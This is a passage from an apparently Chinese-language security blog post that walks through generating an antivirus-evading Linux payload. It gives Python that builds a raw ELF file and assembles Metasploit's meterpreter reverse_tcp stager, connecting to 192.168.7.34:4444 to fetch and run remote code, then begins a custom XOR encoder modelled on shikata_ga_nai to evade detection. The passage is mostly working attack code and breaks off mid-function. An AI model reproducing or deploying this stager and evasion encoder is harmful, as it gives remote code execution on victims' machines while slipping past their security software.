&#123;</span></span><br><span class="line"><span class="string">            uint32_t   p_type;</span></span><br><span class="line"><span class="string">            Elf32_Off  p_offset;</span></span><br><span class="line"><span class="string">            Elf32_Addr p_vaddr;</span></span><br><span class="line"><span class="string">            Elf32_Addr p_paddr;</span></span><br><span class="line"><span class="string">            uint32_t   p_filesz;</span></span><br><span class="line"><span class="string">            uint32_t   p_memsz;</span></span><br><span class="line"><span class="string">            uint32_t   p_flags;</span></span><br><span class="line"><span class="string">            uint32_t   p_align;</span></span><br><span class="line"><span class="string">        &#125; Elf32_Phdr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_paddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_filesz"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_memsz"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_flags"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"p_align"</span>,ElfN_Word)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Phdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct &#123;</span></span><br><span class="line"><span class="string">            uint32_t   p_type;</span></span><br><span class="line"><span class="string">            uint32_t   p_flags;</span></span><br><span class="line"><span class="string">            Elf64_Off  p_offset;</span></span><br><span class="line"><span class="string">            Elf64_Addr p_vaddr;</span></span><br><span class="line"><span class="string">            Elf64_Addr p_paddr;</span></span><br><span class="line"><span class="string">            uint64_t   p_filesz;</span></span><br><span class="line"><span class="string">            uint64_t   p_memsz;</span></span><br><span class="line"><span class="string">            uint64_t   p_align;</span></span><br><span class="line"><span class="string">        &#125; Elf64_Phdr;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"p_flags"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"p_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_paddr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"p_filesz"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_memsz"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"p_align"</span>,ElfN_Off)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Phdr = Elf32_Phdr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Phdr = Elf64_Phdr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_elf_header</span><span class="params">()</span>:</span></span><br><span class="line">    elf_header = ElfN_Ehdr()</span><br><span class="line">    elf_header.e_ident = (</span><br><span class="line">            <span class="number">0x7f</span>,</span><br><span class="line">            ord(<span class="string">"E"</span>),</span><br><span class="line">            ord(<span class="string">"L"</span>),</span><br><span class="line">            ord(<span class="string">"F"</span>),</span><br><span class="line">            EI_CLASS,</span><br><span class="line">            <span class="number">0x1</span>,</span><br><span class="line">            <span class="number">0x1</span></span><br><span class="line">        )</span><br><span class="line">    elf_header.e_type = <span class="number">0x2</span></span><br><span class="line">    elf_header.e_machine = e_machine</span><br><span class="line">    elf_header.e_version = <span class="number">0x1</span></span><br><span class="line">    elf_header.e_entry = <span class="number">0x0</span> <span class="comment"># 补充</span></span><br><span class="line"></span><br><span class="line">    elf_header.e_phoff = c.sizeof(ElfN_Ehdr)</span><br><span class="line">    elf_header.e_shoff = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_flags = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_ehsize = c.sizeof(ElfN_Ehdr)</span><br><span class="line"></span><br><span class="line">    elf_header.e_phentsize = c.sizeof( ElfN_Phdr )</span><br><span class="line">    elf_header.e_phnum = <span class="number">0x1</span></span><br><span class="line">    elf_header.e_shentsize = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_shnum = <span class="number">0x0</span></span><br><span class="line">    elf_header.e_shstrndx = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">return</span> elf_header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_elf_pheader</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> MEM_VADDR</span><br><span class="line">    elf_pheader = ElfN_Phdr()</span><br><span class="line">    elf_pheader.p_type = <span class="number">0x1</span></span><br><span class="line">    elf_pheader.p_flags = <span class="number">0x7</span> </span><br><span class="line">    elf_pheader.p_offset = <span class="number">0x0</span></span><br><span class="line">    elf_pheader.p_vaddr = MEM_VADDR</span><br><span class="line">    elf_pheader.p_paddr = MEM_VADDR</span><br><span class="line">    elf_pheader.p_filesz = <span class="number">0</span> <span class="comment"># 文件大小 </span></span><br><span class="line">    elf_pheader.p_memsz = <span class="number">0</span> <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">    elf_pheader.p_align = <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">return</span> elf_pheader</span><br><span class="line">shellcode = [</span><br><span class="line">   <span class="number">0x90</span>,<span class="number">0x90</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    elf_header = build_elf_header()</span><br><span class="line">    elf_pheader = build_elf_pheader()</span><br><span class="line">    elf_header.e_entry = elf_pheader.p_vaddr + c.sizeof( elf_header ) + c.sizeof( elf_pheader ) </span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">""</span>.join( </span><br><span class="line">            [ </span><br><span class="line">                chr( i ) <span class="keyword">for</span> i <span class="keyword">in</span> shellcode </span><br><span class="line">            ] </span><br><span class="line">        ).encode(<span class="string">"latin-1"</span>)</span><br><span class="line">    </span><br><span class="line">    elf_pheader.p_filesz = c.sizeof( elf_header ) + c.sizeof( elf_pheader )  + len(shellcode)</span><br><span class="line">    elf_pheader.p_memsz  = elf_pheader.p_filesz + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">    elf_pheader_bytes = c.string_at(c.addressof(elf_pheader),c.sizeof(elf_pheader))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.write( elf_header_bytes + elf_pheader_bytes + shellcode )</span><br></pre></td></tr></table></figure>

<h3 id="插入shellcode"><a href="#插入shellcode" class="headerlink" title="插入shellcode"></a>插入shellcode</h3><p>上述elf文件是可以执行，但是啥都没干。为了实现 meterpreter reverse_tcp 的功能，我们这里利用把metasploit中的shellcode代码copy过来，在这里进行汇编，写入elf文件中。</p>
<p>写如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shellcode</span><span class="params">(retry_count = <span class="number">10</span>,host=<span class="string">"192.168.7.34"</span>,port=<span class="string">"4444"</span>)</span>:</span></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86,MODE)</span><br><span class="line"></span><br><span class="line">    encoded_host = hex(sum([<span class="number">256</span>**j*int(i) <span class="keyword">for</span> j,i <span class="keyword">in</span> enumerate(host.split(<span class="string">'.'</span>))]))</span><br><span class="line"></span><br><span class="line">    encoded_port = hex( struct.unpack(<span class="string">"&gt;I"</span>,struct.pack(<span class="string">"&lt;HH"</span>,int(port),<span class="number">0x0200</span>))[<span class="number">0</span>] )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">        shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">            push &#123;retry_count&#125;</span></span><br><span class="line"><span class="string">            pop esi ;</span></span><br><span class="line"><span class="string">        create_socket:</span></span><br><span class="line"><span class="string">            xor ebx, ebx ;</span></span><br><span class="line"><span class="string">            mul ebx ;</span></span><br><span class="line"><span class="string">            push ebx ;</span></span><br><span class="line"><span class="string">            inc ebx ;</span></span><br><span class="line"><span class="string">            push ebx ;</span></span><br><span class="line"><span class="string">            push 0x2 ;</span></span><br><span class="line"><span class="string">            mov al, 0x66 ;</span></span><br><span class="line"><span class="string">            mov ecx, esp ;</span></span><br><span class="line"><span class="string">            int 0x80 </span></span><br><span class="line"><span class="string">            xchg eax, edi   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        set_address:</span></span><br><span class="line"><span class="string">            pop ebx            </span></span><br><span class="line"><span class="string">            push &#123;encoded_host&#125;</span></span><br><span class="line"><span class="string">            push &#123;encoded_port&#125;</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        try_connect:</span></span><br><span class="line"><span class="string">            push 0x66</span></span><br><span class="line"><span class="string">            pop eax</span></span><br><span class="line"><span class="string">            push eax</span></span><br><span class="line"><span class="string">            push ecx</span></span><br><span class="line"><span class="string">            push edi</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string">            inc ebx</span></span><br><span class="line"><span class="string">            int 0x80    </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            jns mprotect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        handle_failure:</span></span><br><span class="line"><span class="string">            dec esi</span></span><br><span class="line"><span class="string">            jz failed</span></span><br><span class="line"><span class="string">            push 0xa2</span></span><br><span class="line"><span class="string">            pop eax</span></span><br><span class="line"><span class="string">            push 0x0</span></span><br><span class="line"><span class="string">            push 0x5</span></span><br><span class="line"><span class="string">            mov ebx, esp</span></span><br><span class="line"><span class="string">            xor ecx, ecx</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            jns create_socket</span></span><br><span class="line"><span class="string">            jmp failed</span></span><br><span class="line"><span class="string">        mprotect:</span></span><br><span class="line"><span class="string">            mov dl, 0x7</span></span><br><span class="line"><span class="string">            mov ecx, 0x1000</span></span><br><span class="line"><span class="string">            mov ebx, esp</span></span><br><span class="line"><span class="string">            shr ebx, 0xc</span></span><br><span class="line"><span class="string">            shl ebx, 0xc</span></span><br><span class="line"><span class="string">            mov al, 0x7d</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        recv:</span></span><br><span class="line"><span class="string">            pop ebx</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            mov edx, 0x6A</span></span><br><span class="line"><span class="string">            mov al, 0x3</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string">            jmp ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">            mov eax, 0x1</span></span><br><span class="line"><span class="string">            mov ebx, 0x1 </span></span><br><span class="line"><span class="string">            int 0x80         </span></span><br><span class="line"><span class="string">        '''</span>.format(</span><br><span class="line">            retry_count = retry_count,</span><br><span class="line">            encoded_host=encoded_host,</span><br><span class="line">            encoded_port = encoded_port</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">        mmap:</span></span><br><span class="line"><span class="string">            xor    rdi, rdi</span></span><br><span class="line"><span class="string">            push   0x9</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            mov    dh, 0x10</span></span><br><span class="line"><span class="string">            mov    rsi, rdx</span></span><br><span class="line"><span class="string">            xor    r9, r9</span></span><br><span class="line"><span class="string">            push   0x22</span></span><br><span class="line"><span class="string">            pop    r10</span></span><br><span class="line"><span class="string">            mov    dl, 0x7</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            push  &#123;retry_count&#125;  </span></span><br><span class="line"><span class="string">            pop    r9</span></span><br><span class="line"><span class="string">            push   rax</span></span><br><span class="line"><span class="string">            push   0x29</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            push   0x2</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            push   0x1</span></span><br><span class="line"><span class="string">            pop    rsi</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            xchg   rdi, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        connect:</span></span><br><span class="line"><span class="string">            mov    rcx, &#123;encoded_host&#125;&#123;encoded_port&#125;</span></span><br><span class="line"><span class="string">            push   rcx</span></span><br><span class="line"><span class="string">            mov    rsi, rsp</span></span><br><span class="line"><span class="string">            push   0x10</span></span><br><span class="line"><span class="string">            pop    rdx</span></span><br><span class="line"><span class="string">            push   0x2a</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            jns    recv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        handle_failure:</span></span><br><span class="line"><span class="string">            dec    r9</span></span><br><span class="line"><span class="string">            jz     failed</span></span><br><span class="line"><span class="string">            push   rdi</span></span><br><span class="line"><span class="string">            push   0x23</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            push   0x0</span></span><br><span class="line"><span class="string">            push   0x5</span></span><br><span class="line"><span class="string">            mov    rdi, rsp</span></span><br><span class="line"><span class="string">            xor    rsi, rsi</span></span><br><span class="line"><span class="string">            syscall              </span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            jns    connect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">            push   0x3c</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            push   0x1</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        recv:</span></span><br><span class="line"><span class="string">            pop    rsi</span></span><br><span class="line"><span class="string">            push   0x7E</span></span><br><span class="line"><span class="string">            pop    rdx</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js     failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            jmp    rsi</span></span><br><span class="line"><span class="string">        '''</span>.format(</span><br><span class="line">            retry_count = retry_count,</span><br><span class="line">            encoded_host=encoded_host,</span><br><span class="line">            encoded_port = encoded_port.replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="comment"># print(shellcode)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encoding, count = ks.asm(shellcode)</span><br><span class="line">        <span class="keyword">return</span> encoding</span><br><span class="line">    <span class="keyword">except</span> k.KsError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: %s"</span> %e)</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

<p>主要是利用 keystone 这个汇编器对代码进行汇编，然后写入到elf文件中。<br>上述代码运行成功后，可以根据选择的架构生成 <code>64</code> 或者 <code>32</code> 位的elf文件，并且经过测试，功能都是正常的。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-23-09-54-18.png" alt=""></p>
<p>但是这样生成的二进制和利用 metasploit 直接生成的毫无差别，所以并不免杀。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-23-09-57-46.png" alt=""></p>
<p>接下来我们就尝试编写自己的编码器，使得可以完全构建出免杀的文件。</p>
<h2 id="编写shellcode编码器"><a href="#编写shellcode编码器" class="headerlink" title="编写shellcode编码器"></a>编写shellcode编码器</h2><p>在上一篇文章中，主要写了编码器 <code>x86/shikata_ga_nai</code> 比较容易被识别的一些静态特征，本文也不做太多的深入研究，我们就简单的修改metasploit的encoder <code>x86/shikata_ga_nai</code> 的代码，试图去除这些比较明显的静态特征，看是否能够满足当前的免杀需求。</p>
<p>首先我们模仿一下编码器 <code>x86/shikata_ga_nai</code> 的代码结构，来生成一个用来解密 shellcode 的 decoder_sub,代码实现如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shikata_block</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">        regs = [ <span class="string">"eax"</span>,<span class="string">"ebx"</span>,<span class="string">"ecx"</span>,<span class="string">"edx"</span>,<span class="string">"esi"</span>,<span class="string">"edi"</span> ]</span><br><span class="line">        stack_base = <span class="string">"ebp"</span></span><br><span class="line">        stack_head = <span class="string">"esp"</span></span><br><span class="line">        addr_size = <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regs = [ <span class="string">"rax"</span>,<span class="string">"rbx"</span>,<span class="string">"rcx"</span>,<span class="string">"rdx"</span>,<span class="string">"rsi"</span>,<span class="string">"rdi"</span>  ] </span><br><span class="line">        stack_base = <span class="string">"rbp"</span></span><br><span class="line">        stack_head = <span class="string">"rsp"</span>  </span><br><span class="line">        addr_size = <span class="number">0x8</span> </span><br><span class="line">    </span><br><span class="line">    fpus = []</span><br><span class="line">    fpus += [ bytes([<span class="number">0xd9</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xe8</span>,<span class="number">0xee</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xd9</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xda</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xdf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xdb</span>,i ])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xdd</span>,i ])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    <span class="comment"># fpus += [ b"\xd9\xd0",b"\xd9\xe1",b"\xd9\xf6",b"\xd9\xf7",b"\xd9\xe5" ]</span></span><br><span class="line"></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86,MODE)</span><br><span class="line"></span><br><span class="line">    code = []</span><br><span class="line">    <span class="comment"># print( random.choice(fpus) )</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append_code</span><span class="params">(code,asm=None,bytes_code=None,compile=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">          code = [</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "index":"当前指令偏移",</span></span><br><span class="line"><span class="string">                    "asm":"助记符",</span></span><br><span class="line"><span class="string">                    "bytes_code":[12,34] # 编译后的整形</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ]</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> len(code):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            last = code[<span class="number">-1</span>]</span><br><span class="line">            index = last[<span class="string">"index"</span>] + len(last[<span class="string">"bytes_code"</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> compile:</span><br><span class="line">            code.append(&#123;</span><br><span class="line">                <span class="string">"index"</span>:index,</span><br><span class="line">                <span class="string">"asm"</span>:asm,</span><br><span class="line">                <span class="string">"bytes_code"</span>:[i <span class="keyword">for</span> i <span class="keyword">in</span> bytes_code]</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                encoding, count = ks.asm(asm)</span><br><span class="line">                code.append(&#123;</span><br><span class="line">                    <span class="string">"index"</span>:index,</span><br><span class="line">                    <span class="string">"asm"</span>:asm,</span><br><span class="line">                    <span class="string">"bytes_code"</span>:encoding</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> k.KsError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"ERROR: %s"</span> %e)</span><br><span class="line">                <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">    code = append_code( </span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format( stack_base,stack_head )</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># code += []</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"sub &#123;&#125;,&#123;&#125;"</span>.format( stack_head, addr_size * <span class="number">0x4</span> )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    reg_caches = []</span><br><span class="line"></span><br><span class="line">    reg_caches.extend( [<span class="string">"rcx"</span>,<span class="string">"ecx"</span>] )</span><br><span class="line"></span><br><span class="line">    reg_1 = random.choice(reg_caches)</span><br><span class="line">    <span class="keyword">while</span> reg_1 <span class="keyword">in</span> reg_caches:</span><br><span class="line">        reg_1 = random.choice(regs)</span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format( reg_1,stack_head)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#fpus command</span></span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"fpus"</span>,</span><br><span class="line">        bytes_code = random.choice( fpus ),</span><br><span class="line">        compile=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format( reg_1,stack_head)] </span></span><br><span class="line">    location_ss = random.randint(<span class="number">3</span>,<span class="number">12</span>) </span><br><span class="line">    <span class="comment"># code += ["fnstenv [&#123;&#125; - &#123;&#125;]".format(reg_1,hex(location_ss * 4))]</span></span><br><span class="line">    code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm = <span class="string">"fnstenv [&#123;&#125; - &#123;&#125;]"</span>.format(reg_1,hex(location_ss * <span class="number">4</span>))</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"sub &#123;&#125;,&#123;&#125;"</span>.format( stack_head,hex( (location_ss - <span class="number">3</span>)*<span class="number">4</span> ) )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"pop &#123;&#125;"</span>.format(reg_1)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># code += ["sub esp,&#123;&#125;".format( hex( (location_ss - 3)*4 ) ) ]</span></span><br><span class="line">    <span class="comment"># code += ["pop &#123;&#125;".format(reg_1)]</span></span><br><span class="line"></span><br><span class="line">    key_table = [ i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x80</span>,<span class="number">0xFF</span>) ]</span><br><span class="line">    key = bytes([ random.choice( key_table ) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)  ])</span><br><span class="line">    print(<span class="string">"[*] the decode key is: &#123;&#125;."</span>.format(key))</span><br><span class="line">    key_int = struct.unpack(<span class="string">"&lt;I"</span>,key)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    reg_2 = random.choice( reg_caches )</span><br><span class="line">    <span class="keyword">while</span> reg_2 <span class="keyword">in</span> reg_caches:</span><br><span class="line">        reg_2 = random.choice(regs)</span><br><span class="line">    <span class="keyword">if</span> reg_2.startswith(<span class="string">"r"</span>):</span><br><span class="line">        reg_2 = reg_2.replace(<span class="string">"r"</span>,<span class="string">"e"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print( "mov &#123;&#125;,&#123;&#125;".format(reg_2,key_int )  )</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(reg_2,key_int )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format(reg_2,key_int )]</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"xor ecx,ecx"</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># code += [ "xor ecx,ecx" ] # loop count</span></span><br><span class="line">    </span><br><span class="line">    code_length = len(shellcode) <span class="comment"># 修正这个长度</span></span><br><span class="line">    print(<span class="string">"[*] len of shellcode : &#123;&#125;."</span>.format(code_length))</span><br><span class="line">    code_length += <span class="number">4</span> + (<span class="number">4</span> - (code_length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    print(<span class="string">"[*] encode length is: &#123;&#125;."</span>.format(code_length))</span><br><span class="line">    code_length //= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code_length &lt;= <span class="number">255</span>):</span><br><span class="line">        <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format("cl",code_length) ]</span></span><br><span class="line">        code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(<span class="string">"cl"</span>,code_length)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> (code_length &lt;= <span class="number">65536</span>):</span><br><span class="line">        <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format("ecx",code_length) ]</span></span><br><span class="line">        code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(<span class="string">"ecx"</span>,code_length)</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    dd = <span class="number">0x23</span> <span class="comment"># header length</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       # 查 intel 手册得知</span></span><br><span class="line"><span class="string">       xor [reg+offset],reg # 此变长指令在 offset &lt;= 0x7F 为定长三字节</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"decode: xor [&#123;&#125;+&#123;&#125;],&#123;&#125;"</span>.format( reg_1,dd,reg_2 )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    decode_label = code[<span class="number">-1</span>][<span class="string">"index"</span>]</span><br><span class="line">    <span class="comment"># code += [ "decode: xor [&#123;&#125;+&#123;&#125;],&#123;&#125;".format( reg_1,dd,reg_2 ) ] # 查 intel 手册得知此指令为 3 字节</span></span><br><span class="line">    <span class="comment"># code += [ "add &#123;&#125;,[&#123;&#125;+&#123;&#125;]".format( reg_2,reg_1,dd ) ] # 先不实现这个逻辑</span></span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"add &#123;&#125;,4"</span>.format(reg_1)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    current_index = code[<span class="number">-1</span>][<span class="string">"index"</span>] + len( code[<span class="number">-1</span>][<span class="string">"bytes_code"</span>] ) </span><br><span class="line">    <span class="comment"># append loop 